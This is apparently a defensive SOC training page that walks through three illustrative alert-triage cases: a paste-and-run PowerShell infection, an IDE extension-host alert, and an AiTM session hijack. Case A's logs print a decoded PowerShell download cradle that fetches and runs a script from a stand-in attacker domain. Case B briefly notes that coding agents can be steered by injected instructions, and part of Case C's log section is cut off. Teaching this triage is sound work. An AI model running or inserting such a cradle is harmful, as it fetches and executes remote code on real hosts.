<Callout variant="warn" title="The cases are illustrative, not photorealistic">
Real telemetry is messier: missing parent processes, offset timestamps across log sources, partial coverage on the host you most need, retention that ends before the staging activity, and one user who never enabled MFA. In production, expect to reconcile sources, file tooling-gap tickets, and write "unable to determine" where the evidence runs out. The methodology gives you a place to stand when the data isn't clean; it doesn't pretend the data is.
</Callout>

<h2 id="case-a">Case A · The finance-team phishing alert</h2>

The spine of the whole walkthrough: a phishing-delivered process chain on a finance laptop. Every later chapter's example picks this case up where the previous phase left it.

<ChapterExample
  title="Case A · The paste-and-run chain on a finance laptop"
  scenario="A SIEM rule fires at 09:11 UTC on Tuesday 3 March 2026. On a finance laptop, PowerShell started straight from the Windows shell (explorer.exe) with -NoProfile -WindowStyle Hidden -EncodedCommand. The destination of the resulting network call is a domain registered four days ago. The named user is dlin, a finance analyst."
>

<ExampleStepper steps={["Read the detection", "Validate the signal", "Parse the metadata", "Frame the hypothesis", "Hand to Subject"]}>

  <div data-step class="example-step">
    <h3>Step 1. Read the detection</h3>
    <p>Before anything else, the analyst reads what fired and why. The rule correlates three behavioral signals: <strong>a script interpreter launched straight from the Windows shell or from an Office process (here explorer.exe → powershell.exe, the edge a command typed or pasted into the Run dialog leaves)</strong>, <strong><code>-EncodedCommand</code> with <code>-NoProfile</code></strong> (a near-universal indicator of automated execution), and <strong>an outbound connection to a low-reputation domain within 30 seconds</strong>, read from the web proxy logs. It is a correlation rule built on behavior rather than a signature for one file. Roughly 1 fire in 200 is documented as a false positive (a precision of about 99.5%), and precision is highest when the chain is complete. Three signals in one chain give the analyst a strong prior before the payload is even open.</p>
    <p>A currency note: the parent is the Windows shell, not Word. Since Microsoft began blocking macros in internet-sourced Office files by default in 2022, much commodity initial access has moved to LNK and HTML smuggling, fake-update lures, and paste-and-run lures (<DefineTerm term="ClickFix (fake CAPTCHA / paste-and-run)" display="ClickFix" />, ATT&amp;CK T1204.004, User Execution: Malicious Copy and Paste). A paste-and-run lure delivers no file, so the <DefineTerm term="Mark of the Web (MOTW)" display="Mark of the Web" /> and Office's macro block never come into play: the user runs the command, and the only process between the user and PowerShell is Explorer, which owns the Run dialog. That is why the rule's first leg names explorer.exe as well as Office.</p>
  </div>

  <div data-step class="example-step">
    <h3>Step 2. Validate the signal</h3>
    <p>The four validation checks:</p>
    <ul class="example-step__list">
      <li><strong>Technical.</strong> The parent-child chain is a common initial-access shape: the Windows shell launches a hidden, encoded PowerShell download cradle with no document or installer in between, which is what a pasted Run-dialog command leaves behind. Commodity loaders and post-exploitation frameworks such as <DefineTerm term="EmPyre / Empire" display="PowerShell Empire" /> share it, so the shape says "staged, automated execution", not "this actor".</li>
      <li><strong>Environmental.</strong> Finance analysts on this laptop class do not normally invoke PowerShell. The host's 30-day baseline confirms it.</li>
      <li><strong>Intelligence.</strong> The destination domain was registered four days ago (2026-02-27) and carries a free domain-validated TLS certificate issued the same day, visible in Certificate Transparency logs. It has low prevalence and resolves to 203.0.113.77, at a hosting provider that appears repeatedly in commodity-phishing reporting.</li>
      <li><strong>Business.</strong> dlin has read access, through federated SSO, to the cloud finance reporting platform, which feeds the vendor payment workflow and stores vendor-contact records, including those of people in the EU. The laptop is a trust pivot toward regulated data: reach, not access, at this point.</li>
    </ul>
    <p>All four checks agree the signal is worth a deeper investigation. None is decisive on its own; the combination is.</p>
  </div>

  <div data-step class="example-step">
    <h3>Step 3. Parse the metadata</h3>
    <p>Structured extraction from the alert payload:</p>
    <Reveal summary="Show the raw records behind the summary" variant="example">
    <pre><code>{`Web proxy, 2026-03-03 09:10:06 UTC
  laptop-finance-09  dlin  CONNECT invoice-records[.]example:443  203.0.113.77
  client_port=52071 (EDR network event for chrome.exe pid 3920: local port 52071)

EDR registry event, laptop-finance-09, 09:11:40 UTC
  key:      HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU
  value:    a   written by: explorer.exe (4416)
  data:     the command line below, then a decoy "verification" comment

EDR process event, laptop-finance-09, 09:11:41 UTC
  process:  powershell.exe          pid: 8128   user: dlin
  parent:   explorer.exe            pid: 4416   (dlin's desktop shell)
  cmdline:  powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3...
  decoded:  IEX (New-Object Net.WebClient).DownloadString('https://invoice-records[.]example/upd')

Web proxy, 09:11:43 UTC
  laptop-finance-09  dlin  CONNECT invoice-records[.]example:443  203.0.113.77
  bytes_in=18432  client_port=52114 (EDR network event for pid 8128: local port 52114)`}</code></pre>
    <p>The summary below rests on four fields: the parent, the RunMRU value written one second before the launch, and the two client ports that tie the proxy records to Chrome and to PID 8128.</p>
    </Reveal>
    <ul class="example-step__list">
      <li><strong>Command line.</strong> <code>powershell.exe -NoP -W Hidden -EncodedCommand &lt;base64&gt;</code>. The base64 decodes to a one-line download cradle that pulls a script from <code>invoice-records[.]example/upd</code> and runs it in memory.</li>
      <li><strong>Process tree.</strong> explorer.exe (PID 4416) → powershell.exe (PID 8128). Explorer is the parent because the Run dialog belongs to it. One second before the launch, Explorer wrote the same command line to dlin's RunMRU key, the history of commands run from Win+R, followed by a comment dressed up as a verification code. Ninety-five seconds earlier, at 09:10:06 UTC, Chrome opened a page on the same domain. A browser visit, then a Run-dialog command that pulls from the site just visited, is the shape of a paste-and-run lure: a fake check that tells the user to paste a command it has already put on the clipboard. The analyst does not open the link to look at the page. It is live attacker infrastructure, and the RunMRU value already shows what the page asked for.</li>
      <li><strong>Network.</strong> 09:11:43 UTC: through the web proxy, a connection to <code>invoice-records[.]example:443</code> (203.0.113.77), 18,432 bytes in. Valid domain-validated certificate issued 2026-02-27. Short connections follow at 09:11:57 and 09:12:29, then roughly every 30 seconds: a beacon, still running.</li>
      <li><strong>File system.</strong> <code>%TEMP%\upd.ps1</code> written at 09:11:44 UTC by powershell.exe (PID 8128), one second after the transfer: the in-memory stage writing a copy of itself to disk. SHA-256 captured. PID 8128 is still running.</li>
      <li><strong>Identity.</strong> Active session: dlin@corp. Logon type 2 (interactive). MFA satisfied at the 09:08 interactive login.</li>
    </ul>
    <p class="example-step__what-not"><strong>What a less experienced analyst could miss:</strong> reading "MFA satisfied" as evidence the account is safe. MFA proved a human logged in at 09:08; it says nothing about what ran under that session three minutes later. The alert is about post-authentication behavior, and clean authentication does not weaken it.</p>
  </div>

  <div data-step class="example-step">
    <h3>Step 4. Frame the hypothesis</h3>
    <p>Alert finishes by stating the hypothesis the next phases will test. <strong>Working hypothesis:</strong> an attacker emailed a link to a fake verification page; dlin opened it, followed the page's instruction to paste a command into the Run dialog, and so launched the PowerShell stage herself; the stage pulled a script from a recently registered domain and is beaconing to it now. The shape is a common commodity-loader pattern; it does not identify an actor. <strong>Alternatives tested:</strong> an authorized red-team exercise or phishing simulation (none on the security calendar this week, checked at 09:22) and an IT or admin script, including a command IT support gave dlin to run (no PowerShell under this user in 30 days, no open help-desk ticket for dlin, and nothing in the decoded cradle resembles IT tooling). Both are ruled out.</p>
    <p>The phrasing is deliberate. The analyst is not declaring an incident. They are recording an actionable hypothesis with explicit evidence and known gaps, so Subject knows where to expand the investigation.</p>
  </div>

  <div data-step class="example-step">
    <h3>Step 5. Hand to Subject</h3>
    <p>The filled handoff, in the <a href="/docs/alert/transition/">transition's</a> three deliverables (Steps 1 to 3 are the validated alert):</p>
    <ul class="example-step__list">
      <li><strong>Named entities.</strong> dlin (user), laptop-finance-09 (host), invoice-records[.]example and 203.0.113.77 (external infrastructure), the originating sender (to come from the message trace).</li>
      <li><strong>Leads for Subject and Uncover.</strong> The working hypothesis and its two ruled-out alternatives. Known gaps: the delivery path is inferred from the browser visit and the Run-dialog launch, not yet confirmed by a message trace; nothing is known yet about what the stage did after 09:11:44, or whether anything has used dlin's federated session. Open questions: who else got the email, did anyone else open it, and did execution follow?</li>
      <li><strong>Flags for Scope, Risk, and the Escalation decision.</strong> Scope: regulated data is in reach through the platform (reach only; nothing accessed so far). Control gap for Risk and Documentation: nothing on this laptop blocks a script interpreter launched from the Run dialog. The EDR's script-control prevention policy is enforced only on a pilot group, and laptop-finance-09 is not in it. Escalation: <strong>the escalation tripwire is met</strong>. Criterion 1, confirmed malicious activity not fully contained by a control, holds at High confidence: a decoded download cradle, a completed transfer recorded independently by EDR and the proxy, a beacon still running at 09:24, and the alternatives ruled out.</li>
      <li><strong>Depth.</strong> Level 1. No pattern entry covers a live download cradle, and regulated data in reach fails the Level 0 gate. Level 2 does not apply yet: one subject, ordinary privilege, a platform in reach but not touched. Any sign that dlin's session left the laptop moves the case up.</li>
      <li><strong>Confidence.</strong> High on the execution chain (EDR process and file events, corroborated by the independent proxy record); delivery path unconfirmed pending the message trace; low on attribution (a shape shared by many commodity loaders and frameworks, with no actor-specific indicator). Labels per the <a href="/docs/documentation/standards/#confidence">shared rubric</a>.</li>
    </ul>
  </div>

</ExampleStepper>

</ChapterExample>

<Callout variant="warn" title="Where this case should have escalated">
Step 5 recorded the right flag, and then the analyst carried it forward instead of acting on it. Under the [escalation tripwire](/docs/escalation/criteria/), a confirmed criterion escalates from whatever phase it is confirmed in, and criterion 1 was confirmed here, at 09:24 UTC. The correct move was an early Escalation decision: page IR, preserve evidence on the host, run the pre-authorized actions (isolate the laptop, block dlin's sign-in, revoke her sessions), and let the later phases run as scoping support under IR's clock. The walkthrough follows the record as it actually ran, so the later chapters show the cost: a stolen session replayed at 10:41:07 UTC and a second laptop compromised from 10:52 UTC, both in the hours a 09:24 page would very likely have closed off. Learn each phase's work from those pages; do not learn the clock.
</Callout>

<h2 id="case-b">Case B · The developer-workstation Empire-pattern alert</h2>

A second alert fires eight days after Case A, on Wednesday 11 March, on a different team's laptop. The parent-child chain looks superficially similar, but the host, the user, and the binary all tell a different story.

<ChapterExample
  title="Case B · The Cursor IDE Empire-pattern alert"
  scenario="A behavioral-EDR alert fires at 14:03:11 UTC on 11 March 2026 on a managed macOS developer workstation. Cursor Helper (Plugin), the extension host of the Cursor AI-assisted IDE, runs without its sandbox by design; it launched a child process that opened encrypted outbound connections. The rule maps the pattern to Empire-style macOS post-exploitation behavior. The named user is a frontend engineer."
>

<ExampleStepper steps={["Read the detection", "Validate the signal", "Parse the metadata", "Frame the hypothesis", "Hand to Subject"]}>

  <div data-step class="example-step">
    <h3>Step 1. Read the detection</h3>
    <p>The rule is a cross-platform rule, hand-written logic describing a behavior sequence (rule-based and behavioral), looking for "a helper process running without its sandbox spawns a child that opens an encrypted outbound socket." It was first written after an engagement against EmPyre, the Python macOS/Linux agent folded into Empire 2.0 in 2017, and later generalized. The lineage is a calibration fact: EmPyre needed Python 2.7, which Apple removed in macOS 12.3 (2022). Current Python- and Node-based macOS implants still match the generalized behavior, but developer tooling produces it far more often: on macOS developer hosts the rule fires about six times as often as on managed productivity laptops, mostly on benign true positives, as the rule's metadata records. The analyst notes the lower prior before opening the payload. Lower is not zero, and the realistic threat on a developer host now rides inside the signed IDE rather than imitating it: a malicious extension (in July 2025 a fake extension from the Open VSX registry ran in Cursor and preceded the theft of about $500,000 in cryptocurrency, <a href="https://securelist.com/open-source-package-for-cursor-ai-turned-into-a-crypto-heist/116908/">Kaspersky</a>), a rogue <DefineTerm term="Model Context Protocol (MCP)" display="MCP" /> server, a poisoned package script, or a coding agent steered by instructions hidden in a file or page it reads (<DefineTerm term="Indirect Prompt Injection" display="indirect prompt injection" />).</p>
  </div>

  <div data-step class="example-step">
    <h3>Step 2. Validate the signal</h3>
    <p>The four validation checks read differently from Case A:</p>
    <ul class="example-step__list">
      <li><strong>Technical.</strong> The pattern overlaps with Empire's macOS agent behavior at the surface level. But the binary is signed with Anysphere's Developer ID and <DefineTerm term="Notarization" display="notarized by Apple">Apple's automated malware scan of software signed with a Developer ID. A notarization ticket shows Apple scanned that exact build; it does not show that the build's behavior on your host is benign.</DefineTerm>, it runs from the app bundle in <code>/Applications</code>, and the child's command line names a script inside that same bundle, not a user-writable staging area. Any admin-group user can write to <code>/Applications</code>, so the path counts only once the MDM record confirms the installed version and hash. And the signature covers the bundle, not which extension or agent action told the host to launch the child.</li>
      <li><strong>Environmental.</strong> The host is a managed developer workstation, and Cursor is an approved application the MDM deploys to the developer fleet. Helper-process activity from IDEs is part of the baseline for this host class. Whether this host matches its peers is a question for Uncover; the alert cannot answer it.</li>
      <li><strong>Intelligence.</strong> Nothing in current intelligence ties the vendor, the binary's hash, or the destinations to malicious activity. The TLS destinations (<code>repo42.cursor.sh</code>, <code>api2.cursor.sh</code>) are Cursor-owned hosts on the vendor's published network allowlist, with valid certificates matching the requested names.</li>
      <li><strong>Business.</strong> High stakes if real: the host holds source code and developer credentials, including SSH keys that reach the build environment. That raises the bar for closing; it does not lower the likelihood.</li>
    </ul>
    <p>The environmental and intelligence checks point away from compromise and the technical match is surface-level, but the business check says a wrong close would be expensive, so the benign read must be confirmed, not assumed. On the detection axis the alert already reads true positive; the activity axis stays undetermined until Subject and Uncover establish what code the host was running.</p>
    <p class="example-step__what-not"><strong>What a less experienced analyst could miss:</strong> treating "signed and notarized" as a clear on its own. Signed malware exists, and so do stolen certificates; the signature proves who published the binary, not that its behavior is benign. What carries the weight is the combination: signature <em>plus</em> an install the MDM record confirms (version and hash) <em>plus</em> peer-group baseline <em>plus</em> vendor-documented behavior. Any one of those alone is a weaker claim than it feels, and none of them, alone or together, covers the extension code the signed host runs.</p>
  </div>

  <div data-step class="example-step">
    <h3>Step 3. Parse the metadata</h3>
    <Reveal summary="Show the raw records behind the summary" variant="example">
    <pre><code>{`EDR process event, dev-mac-0417, 2026-03-11 14:03:10 UTC
  process:  Cursor Helper (Plugin)   pid: 41877   user: user-7f3a (pseudonymized)
  parent:   Cursor Helper (Plugin) --type=utility   (the extension host, no sandbox)
  image:    /Applications/Cursor.app/Contents/Frameworks/Cursor Helper (Plugin).app/Contents/MacOS/Cursor Helper (Plugin)
  script:   /Applications/Cursor.app/Contents/Resources/app/extensions/...
  signing:  Developer ID Application: Anysphere (Team ID verified), notarized by Apple

EDR network events, 14:03:11 UTC
  pid 41877 -> repo42.cursor.sh:443   TLS, certificate valid for the requested name
  pid 41877 -> api2.cursor.sh:443     TLS, certificate valid for the requested name`}</code></pre>
    <p>The summary below rests on the script path inside the signed bundle and the destination names. The record does not say which extension the script belongs to.</p>
    </Reveal>
    <ul class="example-step__list">
      <li><strong>Command line.</strong> The parent is the extension host, <code>Cursor Helper (Plugin) --type=utility</code>, vendor-standard. The child (PID 41877) is the same binary running a script from <code>/Applications/Cursor.app/Contents/Resources/app/extensions/</code>, the built-in extensions directory inside the app bundle.</li>
      <li><strong>Process tree.</strong> launchd → Cursor (main app, 14:03:02) → the extension host (14:03:09, no sandbox) → the child (14:03:10), which made the TLS connections at 14:03:11. In VS Code-family editors such as Cursor, the extension host legitimately launches processes of its own. Every Cursor binary in the chain is signed by Anysphere (Developer ID) and notarized by Apple; launchd is Apple's platform-signed init process.</li>
      <li><strong>Network.</strong> TLS connections only to Cursor-owned domains on the vendor's published network allowlist (<code>&#42;.cursor.sh</code>, <code>&#42;.cursorapi.com</code>), all with valid certificates matching the requested names. No direct connections to third-party model providers, which is expected: Cursor routes model requests through its own backend.</li>
      <li><strong>File system.</strong> Reads inside the open workspace and Cursor's application support directory (<code>&#126;/Library/Application Support/Cursor</code>). No writes outside expected paths, and no reads of credential paths in the alert's event window.</li>
      <li><strong>Identity.</strong> Active session: a frontend engineer, standard user, no admin rights. SSO sign-in at 09:14 with FIDO2 second factor.</li>
    </ul>
  </div>

  <div data-step class="example-step">
    <h3>Step 4. Frame the hypothesis</h3>
    <p><strong>Working hypothesis:</strong> the rule correctly recognized a behavior that overlaps with Empire-style macOS tradecraft. The binary, signature chain, install record, and behavioral baseline all suggest this is the IDE's extension host doing its documented job, not adversary tooling. Signer and path do not settle it on their own, because the IDE runs extension code, MCP servers and agent commands the signature does not vouch for. Subject and Uncover will either confirm the benign read or surface signals that override it.</p>
    <p>The hypothesis is deliberately not "definitely not malicious." The Alert phase records what the evidence permits, not what the analyst feels.</p>
  </div>

  <div data-step class="example-step">
    <h3>Step 5. Hand to Subject</h3>
    <p>Subject inherits a narrower starting point than in Case A, with explicit caveats:</p>
    <ul class="example-step__list">
      <li><strong>Named entities.</strong> The frontend engineer (user), the macOS laptop (host), Cursor Helper (Plugin) and its child process (binary), Cursor's vendor endpoints (external).</li>
      <li><strong>Leads for Subject and Uncover.</strong> Favored: a bundled Cursor extension doing its documented job. Competing: a malicious or newly updated extension, an MCP server or workspace task riding the signed host, or an agent action the user did not intend; the extension inventory and the child's script path separate them. Open questions: which extension or agent action owned the child, whether the peer match holds at depth (same Cursor version, extensions, and destinations over 30 days), and what discriminators would make a pattern entry for this rule safe.</li>
      <li><strong>Flags for Scope, Risk, and the Escalation decision.</strong> No escalation criterion confirmed or suspected. Regulated data: none on its face. Business stakes High (SSH reach into the build environment). Calibration lead for Documentation: the rule's roughly six-times benign-fire rate on developer hosts.</li>
      <li><strong>Depth.</strong> Level 2. No pattern entry covers this rule on this host class. The child ran with the user's file rights and an encrypted outbound channel on a host whose SSH keys reach the build environment, so until credential-path reads are ruled out, crown-jewel access by the activity is plausible, not merely reachable.</li>
      <li><strong>Confidence.</strong> Medium on the binary identity and signature chain (EDR signing status only so far; Subject corroborates against the MDM record). Low on what the extension host was running, because nothing has examined the extension layer yet. Unexamined means low confidence, not low likelihood. Labels per the <a href="/docs/documentation/standards/#confidence">shared rubric</a>.</li>
    </ul>
  </div>

</ExampleStepper>

</ChapterExample>

<h2 id="case-c">Case C · The SaaS-tenant token-theft alert</h2>

The third case never touches an endpoint. Everything the analyst will see lives in the identity provider's sign-in log and the SaaS tenant's audit log, and the methodology has to work anyway.

<ChapterExample
  title="Case C · The replayed session on the mail tenant"
  scenario="A SIEM correlation rule fires at 09:15 UTC on Thursday 12 March 2026. The identity provider flagged a risky session at 09:03: a session token for rvega, a customer-success lead, was replayed from a hosting-provider IP in another country with a different browser fingerprint and no sign-in behind it, sixteen minutes after her normal corporate sign-in and ten minutes after a second, MFA-satisfied sign-in from a different hosting IP that followed a link click. Three minutes later, the tenant audit log recorded a new inbox rule on her mailbox. No endpoint alert fired anywhere."
>

<ExampleStepper steps={["Read the detection", "Validate the signal", "Parse the metadata", "Frame the hypothesis", "Check the tripwire, hand off"]}>

  <div data-step class="example-step">
    <h3>Step 1. Read the detection</h3>
    <p>The rule is a two-signal correlation: <strong>an IdP risk event (session token presented from a new <DefineTerm term="Autonomous System Number (ASN)" display="autonomous system" /> with a mismatched browser fingerprint, meaning the user agent and device details)</strong> joined to <strong>a new inbox rule created on the same account within 30 minutes</strong>. Either signal alone is noisy: travel and VPNs trip the first, and users create mail rules all day. Together they describe one specific attack: a stolen session being used, then hidden.</p>
    <p>Nothing here shares a host or a PID. The two events are joined on the <strong>account and the session</strong>, as the <a href="/docs/alert/parsing/cloud-identity/">cloud and identity parsing page</a> teaches. Measure the 30-minute window on each event's own timestamp, not its SIEM arrival time: tenant audit records can land long after the events they describe. Here both signals arrived in time; the mail-access records Uncover needs later do not.</p>
  </div>

  <div data-step class="example-step">
    <h3>Step 2. Validate the signal</h3>
    <p>The four validation checks:</p>
    <ul class="example-step__list">
      <li><strong>Technical.</strong> The 09:03 presentation reused an existing session token: no password entry, no <DefineTerm term="Multi-Factor Authentication (MFA)" display="MFA" /> prompt. A legitimate sign-in from a new device would have needed a fresh authentication ceremony (under rvega's policy, password plus MFA). Token reuse without one is the signature of <DefineTerm term="Session Hijack" display="session hijack" /> via a stolen cookie. The token did not come from her 08:47 laptop session: it was issued at 08:53 to a sign-in from a hosting IP, a minute after a link click, which is exactly where an <DefineTerm term="Adversary-in-the-Middle (AiTM)" display="adversary-in-the-middle" /> proxy would have obtained it.</li>
      <li><strong>Environmental.</strong> rvega's 90-day sign-in baseline, read from the SIEM copy, is two devices, one city, one ASN. The 08:53 sign-in and the 09:03 presentation are each a first for their ASN, and 09:03 is also a first for geography and fingerprint. The 08:47 sign-in was normal in every respect.</li>
      <li><strong>Intelligence.</strong> Both source IPs belong to hosting providers whose ranges appear in current reporting on <DefineTerm term="AiTM Phishing" display="AiTM phishing kits" />, which proxy the real login page, relay the password and the MFA approval as the user types them, and capture the session cookie the real service issues.</li>
      <li><strong>Business.</strong> rvega's mailbox holds customer contract and billing threads. Customer-billing mailboxes are a common staging ground for payment-redirect fraud (<DefineTerm term="Business Email Compromise (BEC)" display="business email compromise" />, or BEC) in industry reporting, and the mailbox contents are customer personal data with regulatory weight.</li>
    </ul>
    <p>All four checks point the same direction, and none of them required an endpoint.</p>
  </div>

  <div data-step class="example-step">
    <h3>Step 3. Parse the metadata</h3>
    <p>Structured extraction, from identity and tenant logs instead of a process tree:</p>
    <Reveal summary="Show the raw records behind the summary" variant="example">
    <pre><code>{`IdP sign-in log (SIEM copy), user rvega, 2026-03-12

    <h3>Step 4. Frame the hypothesis</h3>
    <p><strong>Working hypothesis:</strong> rvega followed a phishing link to an AiTM proxy that relayed her 08:53 sign-in, password and MFA approval included, and captured the session cookie the service issued; the attacker replayed that session from a VPS at 09:03, created an inbox-hiding rule to conceal payment-themed mail, and granted consent to an OAuth application for persistent mailbox access. The pattern matches current business-email-compromise staging: the attacker is positioning to read and eventually redirect payment conversations.</p>
    <p>As in Case A, the full story is still a hypothesis with named evidence. The difference is that its core, an attacker operating rvega's mailbox through a replayed session, already rests on two independent sources, and that matters in Step 5.</p>

    <h3>Step 5. Check the escalation tripwire and hand off</h3>
    <p>Before the handoff, the analyst checks the <a href="/docs/escalation/criteria/">escalation tripwire</a>, because a criterion confirmed in any phase escalates the case from that phase.</p>
    <ul class="example-step__list">
      <li><strong>Confidence.</strong> High that an attacker is operating rvega's mailbox through a replayed session: the IdP log shows S2 issued through a hosting IP and replayed from the VPS, the tenant audit independently shows S2 creating the rule and the consent, and a 09:19 phone call rules out the alternatives (rvega is at her desk on the laptop, uses no VPN, created no rule, approved no app, and remembers a push prompt right after opening a shared-document link).       <li><strong>Flags.</strong> Criterion 1, confirmed malicious activity not fully contained by a control: met.       <li><strong>Decision.</strong> The escalation tripwire fires at 09:22: P1 by criterion, recorded as an early Escalation decision. The IR lead is paged by pager and phone bridge, not tenant email or chat, because the mail tenant is the compromised system.</li>
      <li><strong>Depth.</strong> Level 2. An attacker reading a mailbox of customer personal data, with a consented Mail.Read app, makes access to regulated data plausible, not merely reachable.</li>
      <li><strong>Named entities.</strong> rvega (user), session S2, the proxy IP 203.0.113.41, the VPS IP 198.51.100.77, the inbox rule named <code>.</code>, the "Mail Backup Sync" OAuth application, and the lure domain <code>docs-share-portal[.]example</code> from the 08:52 gateway record.</li>
      <li><strong>Open questions.</strong> Who else received the same link, and did anyone else reach the credential step? What has the consented app already read? Did the attacker register MFA methods or devices?</li>

<h2 id="side-by-side">Three cases side by side</h2>

The same five moves produced all three handoffs, and none became a final verdict at Alert. Case A and Case C both met a criterion; only Case C acted on it, and a tripwire escalation hands the case to IR rather than concluding the intrusion. Case B's documented close came later, at the Escalation decision. Every row but the last is the exit checklist an Alert handoff fills before the case leaves the phase.

<KeyTakeaway>
The Alert phase does not declare incidents; it hands forward a defensible hypothesis with explicit evidence, known gaps, and the tripwire checked. Case C makes the parsing chapter's point: with no process tree, the identity chain is the spine of the case. All three cases continue on every later example page.
